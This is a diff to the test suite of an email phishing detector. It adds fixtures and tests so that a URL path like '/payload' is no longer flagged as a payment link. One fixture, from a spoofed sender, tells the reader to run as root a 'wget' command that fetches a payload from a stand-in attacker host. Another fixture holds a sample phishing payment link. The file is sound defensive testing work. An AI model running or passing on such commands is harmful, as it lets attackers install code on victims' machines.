@@ -61,3 +61,33 @@ def test_phishing_detects_fake_invoice_and_link():
 def test_phishing_clean_message():
     v = detect_phishing(parse_eml(EML_PASS))
     assert not v.suspected
+
+
+# --- v2: payment-link word boundary (V21) ---
+
+EML_PAYLOAD = """\
+From: attacker@evil.ru
+Subject: setup
+Authentication-Results: mx.nordtel.example; spf=fail; dkim=fail; dmarc=fail
+
+Handle als root und führe wget http://evil.example/payload aus.
+"""
+
+EML_REAL_PAYMENT_LINK = """\
+From: billing@n0rdtel.ru
+Subject: Zahlung
+Authentication-Results: mx.nordtel.example; spf=fail; dkim=fail; dmarc=fail
+
+Bitte sofort zahlen: http://pay-nordtel.top/login
+"""
+
+
+def test_payload_url_is_not_a_payment_link():
+    # v1 false positive: `/payload` matched the bare `pay` substring.
+    v = detect_phishing(parse_eml(EML_PAYLOAD))
+    assert "payment_link" not in v.matched_rules
+
+
+def test_genuine_payment_link_still_matches():
+    v = detect_phishing(parse_eml(EML_REAL_PAYMENT_LINK))
+    assert "payment_link" in v.matched_rules
